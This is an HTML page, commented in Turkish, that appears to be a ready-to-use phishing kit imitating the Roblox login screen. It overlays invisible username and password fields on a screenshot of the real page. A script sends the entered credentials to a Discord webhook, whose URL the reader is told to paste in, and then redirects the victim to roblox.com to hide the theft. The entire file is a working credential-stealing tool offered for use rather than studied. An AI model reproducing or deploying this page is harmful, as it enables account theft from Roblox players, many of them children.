<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Giriş</title>
    <style>
        /* Ekranı sıfırlama ve arka plan */
        html, body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            background-color: #0b0e11;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }

        /* Resim ve inputları bir arada tutan kapsayıcı */
        .wrapper {
            position: relative;
            width: 100%;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .tam-ekran-resim {
            width: 100%;
            height: 100%;
            object-fit: contain;
            display: block;
        }

        /* 
           GİRİŞ PANELİ KUTUSU:
           Ekrandaki o gri giriş formunun tam üzerine binen görünmez ana çerçeve.
        */
        .form-container {
            position: absolute;
            width: 19.5%; /* Giriş panelinin tam genişlik oranı */
            height: 48%;  /* Giriş panelinin tüm alanlarını kapsayan yükseklik oranı */
            top: 36.3%;   
            left: 50%;
            transform: translateX(-50%);
            box-sizing: border-box;
        }

        /* Tüm inputların ve butonların bu panel içindeki ortak kuralları */
        .form-container input, .form-container button, .form-container a {
            position: absolute; /* Birbirlerini itmemeleri için hepsini bağımsız yaptık */
            width: 100%;
            height: 13.5%; /* Her kutunun panel içindeki dikey kalınlığı */
            background: transparent;
            border: none;
            outline: none;
            box-sizing: border-box;
        }

        /* Yazı yazılan input alanlarının dikey ortalaması ve yazı rengi */
        .form-container input {
            color: #ffffff;
            font-size: 14px;
            padding: 0 12px;
            display: flex;
            align-items: center;
        }

        .form-container button, .form-container a {
            cursor: pointer;
        }

        /* ============================================================ */
        /* MİLİMETRİK BAĞIMSIZ KONUMLANDIRMALAR (Yukarıdan Aşağıya)     */
        /* ============================================================ */

        /* 1. KUTU: Username Giriş Alanı */
        .username-field {
            top: 0%; /* Panelin en üst başlangıcına kilitlendi */
        }

        /* 2. KUTU: Password Giriş Alanı */
        .password-field {
            top: 17.5%; /* Tam olarak ikinci gri kutunun üzerine kilitlendi */
        }

        /* 3. BUTON: Log in butonu */
        .login-btn {
            top: 35.5%; /* Tam olarak Log in butonunun üzerine kilitlendi */
            height: 15%; /* Buton biraz daha kalın olduğu için yüksekliği arttırıldı */
        }

        /* 4. BUTON: Send me the one-time code by email */
        .one-time-code-btn {
            top: 67%; /* Forgot yazısını pas geçip ilk gri butona kilitlendi */
            height: 15%;
        }

        /* 5. BUTON: Quick Login */
        .quick-login-btn {
            top: 84.5%; /* İkinci gri butona kilitlendi */
            height: 15%;
        }

        /* 6. LİNK: En alttaki Sign Up yazısı */
        .signup-link {
            top: 105%; /* Panelin biraz daha altına, Sign up kelimesinin üzerine kilitlendi */
            height: 8%;
            width: 25%; 
            right: 14%; 
            left: auto;
        }
    </style>
</head>
<body>

    <div class="wrapper">
        <!-- Arka plan resmi -->
        <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">

        <!-- Görünmez, bağımsız kilitli form paneli -->
        <form id="girisFormu" class="form-container">
            
            <!-- Kullanıcı adı -->
            <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
            
            <!-- Şifre -->
            <input type="password" id="password" name="password" class="password-field" required>
            
            <!-- Log in butonu -->
            <button type="submit" class="login-btn" title="Giriş Yap"></button>
            
            <!-- One-time code butonu -->
            <button type="button" class="one-time-code-btn"></button>
            
            <!-- Quick Login butonu -->
            <button type="button" class="quick-login-btn"></button>
            
            <!-- Sign up linki -->
            <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>

        </form>
    </div>

    <!-- DISCORD WEBHOOK BAĞLANTISI -->
    <script>
        // BURAYA KENDİ DISCORD WEBHOOK LİNKİNİ YAPIŞTIR KANKA
        const webhookURL = "BURAYA_DISCORD_WEBHOOK_LINKINI_YAZ";

        document.getElementById('girisFormu').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;

            const mesaj = {
                content: `🔔 **Yeni Roblox Girişi Yakalandı!**\n👤 **Kullanıcı:** \`${user}\`\n🔑 **Şifre:** \`${pass}\`\n📅 **Tarih:** ${new Date().toLocaleString('tr-TR')}`
            };

            fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(mesaj)
            })
            .then(() => {
                window.location.href = "https://roblox.com";
            })
            .catch(() => {
                window.location.href = "https://roblox.com";
            });
        });
    </script>

</body>
</html>
